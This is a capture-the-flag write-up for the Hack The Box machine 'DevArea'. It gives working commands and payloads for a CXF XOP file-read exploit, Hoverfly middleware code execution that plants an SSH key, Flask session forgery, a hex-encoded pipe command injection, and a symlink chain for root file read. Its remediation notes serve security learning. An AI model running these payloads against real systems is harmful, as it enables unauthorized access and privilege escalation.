---
title: HTB DevArea
slug: htb-devarea-writeup
type: writeup
category: htb
date: 2026-03-28
difficulty: medium
os: linux
readTime: 14 min read
points: 45
tags: [CVE, SOAP, FLASK]
classification: CLASSIFIED-WHITE
summary: Anonymous FTP drops an employee-service JAR whose embedded Apache CXF (Jetty 9.4.27) is vulnerable to CVE-2022-46364 MTOM XOP file read. Use it to leak `/etc/systemd/system/hoverfly.service` → admin creds → CVE-2025-54123 middleware RCE → SSH as `dev_ryan`. Root chains a leaked Flask `SECRET_KEY` (session forge) + a regex-allow-listed `|` pipe injection in a SysWatch web endpoint + a double-symlink in a sudo-allowed logs command.
engagement:
  platform: Hack The Box
  target: devarea.htb
  ref: 10.129.12.147
  duration: 14 min read
  operator: WDD-01
killchain:
  - { stage: RECON,    sub: "ftp anon + soap",          tag: FTP,     color: warn }
  - { stage: LFI,      sub: "CVE-2022-46364 XOP read",  tag: CVE,     color: warn }
  - { stage: RCE,      sub: "hoverfly middleware",      tag: CVE,     color: warn }
  - { stage: USER,     sub: "ssh as dev_ryan",          tag: SHELL,   color: warn }
  - { stage: PIVOT,    sub: "flask secret forge + pipe injection", tag: SSTI, color: warn }
  - { stage: ROOT,     sub: "double symlink + sudo cat", tag: GOAL,   color: ok }
loadout:
  - { tool: nmap,       purpose: recon }
  - { tool: curl,       purpose: http }
  - { tool: cfr,        purpose: jar-decompile }
  - { tool: python3,    purpose: session-forge }
  - { tool: itsdangerous, purpose: sign }
  - { tool: ssh,        purpose: auth }
remediation:
  - Disable anonymous FTP
  - Upgrade Apache CXF past 3.5.5 / 3.4.10 (CVE-2022-46364) and Hoverfly past 1.11.3 (CVE-2025-54123)
  - Don't ship `SECRET_KEY` in a world-readable env file
  - Regex allow-lists are not command sanitizers — use argv arrays, never `shell=True`
  - Never `cat` a symlink-followed path under a sudo-allowed script
---

::: stage n=1 label="RECON" title="Six open ports — each opens a different door."

::: terminal title="shell · operator@kali" lang="bash"
$ nmap -Pn -sV -p 21,22,80,8080,8500,8888 10.129.12.147
21/tcp   open  ftp      vsftpd 3.0.5     (anonymous)
22/tcp   open  ssh      OpenSSH 9.6p1
80/tcp   open  http     Apache 2.4.58    → devarea.htb static
8080/tcp open  http     Jetty 9.4.27     CXF JAX-WS
8500/tcp open  http     Hoverfly proxy   (auth)
8888/tcp open  http     Hoverfly admin   (auth)
:::

Anonymous FTP → grab `employee-service.jar` from `/pub`:

::: terminal title="shell · operator@kali" lang="bash"
$ curl --user anonymous:anonymous -o employee-service.jar \
    ftp://10.129.12.147/pub/employee-service.jar
:::

Decompile. `ServerStarter.java` binds a SOAP service at `http://0.0.0.0:8080/employeeservice`, and `submitReport` takes a `Report` with a `content` field.

:::

::: stage n=2 label="LFI" title="CVE-2022-46364 — XOP MTOM reference escapes the SOAP body."

Apache CXF + Jetty 9.4.27 is vulnerable to MTOM XOP Include abuse: the `<xop:Include href="...">` tag can reference {red:arbitrary `file://` URIs} which CXF happily dereferences server-side.

::: terminal title="shell · operator@kali · CVE-2022-46364" lang="bash"
$ curl -s -X POST "http://10.129.12.147:8080/employeeservice" \
    -H 'Content-Type: multipart/related; type="application/xop+xml";
        start="<root@cxf>"; start-info="text/xml"; boundary="----=_Part"' \
    --data-binary @payload.xml
:::

Inside `payload.xml`:

::: terminal title="payload.xml" lang="xml"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include
            xmlns:xop="http://www.w3.org/2004/08/xop/include"
            href="file:///etc/systemd/system/hoverfly.service"/>
        </content>
        <department>IT</department>
        <employeeName>test</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
:::

Response base64-encodes the file. `hoverfly.service` exposes the admin credentials baked into `ExecStart`:

```
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password [REDACTED] ...
```

::: warn title="USER FLAG IS BLOCKED"
`employee-service.service` has `InaccessiblePaths=/home/dev_ryan/user.txt` — the LFI can't read it. Need a shell as `dev_ryan`.
:::

:::

::: stage n=3 label="RCE" title="Hoverfly middleware — CVE-2025-54123 argv injection."

Login + grab a JWT:

::: terminal title="shell · hoverfly auth" lang="bash"
$ curl -s -X POST http://10.129.12.147:8888/api/token-auth \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":"[REDACTED]"}'
{"token":"eyJhbGc..."}
:::

The middleware endpoint hands the `binary` field to `exec` and writes the `script` field to a temp file passed as argv:

::: terminal title="shell · CVE-2025-54123" lang="bash"
$ curl -s -X PUT http://10.129.12.147:8888/api/v2/hoverfly/middleware \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{
      "binary":"bash",
      "script":"#!/bin/bash\nmkdir -p /home/dev_ryan/.ssh\necho \"ssh-ed25519 AAAA... attacker\" >> /home/dev_ryan/.ssh/authorized_keys\ncat /dev/stdin",
      "remote":""
    }'
:::

SSH in:

::: terminal title="shell · dev_ryan@devarea" lang="bash"
$ ssh dev_ryan@10.129.12.147
$ cat ~/user.txt
:::

:::

::: stage n=4 label="PIVOT" title="sudo -l points at a ghost — syswatch is mode-denied."

::: terminal title="shell · dev_ryan@devarea" lang="bash"
$ sudo -l
(root) NOPASSWD: /opt/syswatch/syswatch.sh,
    !/opt/syswatch/syswatch.sh web-stop,
    !/opt/syswatch/syswatch.sh web-restart
$ cat /opt/syswatch/syswatch.sh
cat: Permission denied
$ ls ~/
syswatch-v1.zip
:::

ACL deny on `/opt/syswatch/` but a copy of the source lives in `dev_ryan`'s home. Key findings:

- `syswatch.sh` sources `/opt/syswatch/config/syswatch.conf` (root-owned)
- `syswatch.sh logs <file>` accepts symlinks that pass a name regex
- Web GUI on {cool:127.0.0.1:7777} runs as `syswatch`
- `/etc/syswatch.env` contains `SYSWATCH_SECRET_KEY` + the admin password

:::

::: stage n=5 label="SESSION" title="Flask session forge → pipe injection as syswatch."

Secret is readable; forge the session cookie locally:

::: terminal title="shell · session forge" lang="python"
from itsdangerous import URLSafeTimedSerializer
import hashlib

secret = '[REDACTED]'
s = URLSafeTimedSerializer(secret, salt='cookie-session',
    signer_kwargs={'key_derivation':'hmac','digest_method':hashlib.sha1})
cookie = s.dumps({"user_id": 1, "logged_in": True})
:::

The `/service-status` endpoint validates the service name with:

::: terminal title="shell · syswatch web source" lang="python"
SAFE = re.compile(r"^[^;/\&.<>\rA-Z]*$")
subprocess.run([f"systemctl status --no-pager {service}"], shell=True, ...)
:::

Blocklist: `;`, `/`, `&`, `.`, `<`, `>`, `\r`, uppercase A–Z. {warn:Pipe is allowed.} Hex-encode the payload to bypass the `/` and `.` bans:

::: terminal title="shell · command injection" lang="python"
import requests
payload = "ssh|eval $(echo 6c6e... |xxd -r -p)"   # decodes to the ln symlink chain below
requests.post("http://127.0.0.1:7777/service-status",
              cookies={"session": cookie},
              data={"service": payload})
:::

That runs as `syswatch`, which has write access to `/opt/syswatch/logs/` and `/opt/syswatch/backup/`. Good enough.

:::

::: stage n=6 label="ROOT" title="Double symlink in the logs dir — sudo cat follows."

`view_logs()` in `syswatch.sh` accepts a symlink whose target matches `^[A-Za-z0-9_.-]+$` (no slashes) and resolves it *relative* to `$LOG_DIR`, then `cat`s the result as root.

The trick: make the outer symlink point to an inner symlink whose name passes the regex, but whose own target is `/root/root.txt`. The regex check only runs on the first hop:

::: terminal title="shell · syswatch · symlink chain" lang="bash"
# as syswatch via the pipe injection
$ ln -sf /root/root.txt /opt/syswatch/logs/b.log
$ ln -sf b.log           /opt/syswatch/logs/a.log
:::

Trigger the sudo-allowed path as `dev_ryan`:

::: terminal title="shell · dev_ryan@devarea" lang="bash"
$ sudo /opt/syswatch/syswatch.sh logs a.log
<root flag>
:::

`a.log` passes the regex (target `b.log` is name-safe), resolves to `$LOG_DIR/b.log`, then `cat` follows the inner symlink to `/root/root.txt` — all under sudo. {ok:Rooted}.

::: note title="WHY IT WORKED"
Name-validation without path resolution is a classic TOCTOU-adjacent bug: the validator and the consumer are looking at different things. `cat` follows symlinks by default; only the outer name was ever checked. `readlink -f` on the full target before `cat` would have caught it.
:::

:::
